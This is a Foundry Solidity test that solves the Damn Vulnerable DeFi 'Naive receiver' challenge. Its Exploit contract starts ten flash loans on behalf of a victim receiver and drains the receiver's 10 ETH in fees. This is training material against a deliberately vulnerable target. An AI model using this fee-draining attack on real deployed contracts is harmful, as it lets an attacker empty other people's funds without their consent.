// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/DamnValuableToken.sol";

import "src/NaiveReceiver/NaiveReceiverLenderPool.sol";
import "src/NaiveReceiver/FlashLoanReceiver.sol";
import "openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol";

// Challenge #2 - Naive receiver
// https://www.damnvulnerabledefi.xyz/challenges/naive-receiver/

contract Attack is Test {
    FlashLoanReceiver public receiver;
    NaiveReceiverLenderPool public pool;

    address public ETH;

    // Pool has 1000 ETH in balance
    uint256 public constant ETHER_IN_POOL = 1000e18;
    // Receiver has 10 ETH in balance
    uint256 public constant ETHER_IN_RECEIVER = 10e18;

    function setUp() public {
        pool = new NaiveReceiverLenderPool();
        vm.deal(address(pool), ETHER_IN_POOL);

        ETH = pool.ETH();

        receiver = new FlashLoanReceiver(address(pool));
        vm.deal(address(receiver), ETHER_IN_RECEIVER);
    }

    function testInit() public {
        assertEq(address(pool).balance, ETHER_IN_POOL);
        assertEq(pool.maxFlashLoan(ETH), ETHER_IN_POOL);
        assertEq(pool.flashFee(ETH, 0), 1e18);

        vm.expectRevert();
        receiver.onFlashLoan(address(this), ETH, ETHER_IN_RECEIVER, 10e18, "0x");

        assertEq(address(receiver).balance, ETHER_IN_RECEIVER);
    }

    function testEploit() public {
        // Attack Code:
        Exploit exploit = new Exploit();
        exploit.addReceiver(receiver);
        exploit.addPool(pool);
        (bool success,) = address(exploit).call{gas: 30000000}("0x");
        console.log("Send transaction: ", success);

        assertEq(address(receiver).balance, 0);
        assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
    }
}

contract Exploit {
    IERC3156FlashBorrower public receiver;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes public data;
    NaiveReceiverLenderPool public pool;
    uint256 public constant AMOUNT = 100;

    function addReceiver(IERC3156FlashBorrower _receiver) public {
        receiver = _receiver;
    }

    function addPool(NaiveReceiverLenderPool _pool) public {
        pool = _pool;
    }

    fallback() external payable {
        for (uint8 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, AMOUNT, data);
        }
    }
}
